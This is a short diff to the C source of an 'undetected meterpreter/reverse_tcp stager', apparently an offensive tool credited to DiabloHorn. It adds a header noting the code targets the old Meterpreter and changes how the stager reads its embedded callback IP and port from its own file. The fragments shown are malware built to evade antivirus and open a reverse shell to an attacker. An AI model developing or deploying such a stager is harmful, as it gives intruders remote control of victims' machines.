@@ -1,3 +1,9 @@
+/*********************
+
+WARNING THIS IS FOR THE OLD METERPRETER
+THE NON-TRANSPORTS VERSIONS
+
+*********************/
 /*
 	Author: DiabloHorn http://diablohorn.wordpress.com
 	Undetected meterpreter/reverse_tcp stager
@@ -156,12 +162,14 @@ int initwsa(){
 short getcinfo(char *self,char *ipaddr,int len){
 	int i = 0;
 	int offset = 0x4e;
+	errno_t ferr;
 	//[port as little endian hex][ip as string \0 terminated]
 	//9999 -> 270f -> 0f27
 	//127.0.0.1 -> 127.0.0.1
 	//make sure to padd with \0's until max buffer, or this will read weird stuff
 	short port = 0;
-	FILE * file = fopen(self, "r");
+	FILE * file = NULL;
+	ferr = fopen_s(&file, self, "r");
 	fseek(file,offset,SEEK_SET);
 	fread((void *)&port,(size_t)sizeof(short),1,file);
 	fread(ipaddr,(size_t)len,1,file);
